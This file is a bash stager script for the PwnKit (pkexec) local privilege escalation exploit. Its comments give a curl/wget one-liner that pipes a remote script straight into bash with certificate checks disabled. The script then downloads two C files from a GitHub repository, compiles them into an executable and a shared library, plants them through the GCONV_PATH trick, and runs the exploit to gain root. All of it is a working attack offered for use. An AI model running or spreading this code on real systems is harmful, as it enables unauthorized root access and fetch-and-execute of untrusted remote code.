#!/bin/bash

#deploy using command below, where url is the url hosting this file and C files.
#command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"
#example: command -v curl >/dev/null && bash -c "$(curl -fsSLk raw.githubusercontent.com/secw01f/pwnkit/main/stage0.sh)" || bash -c "$(wget --no-check-certificate -q0- raw.githubusercontent.com/secw01f/pwnkit/main/stage0.sh)"

mkdir -p 'GCONV_PATH=.'

echo "module UTF-8// STAGE2// stage2 2" > gconv-modules

command -v curl >/dev/null && curl -fsSLk https://raw.githubusercontent.com/secw01f/pwnkit/main/stage1.c > stage1.c || wget --no-check-certificate -q0- https://raw.githubusercontent.com/secw01f/pwnkit/main/stage1.c > stage1.c
command -v curl >/dev/null && curl -fsSLk https://raw.githubusercontent.com/secw01f/pwnkit/main/stage2.c > stage2.c || wget --no-check-certificate -q0- https://raw.githubusercontent.com/secw01f/pwnkit/main/stage2.c > stage2.c


gcc stage1.c -Wall -fPIC -o stage1
gcc stage2.c -Wall --shared -fPIC -o stage2.so

cp stage2.so GCONV_PATH=./stage2.so:.

./stage1
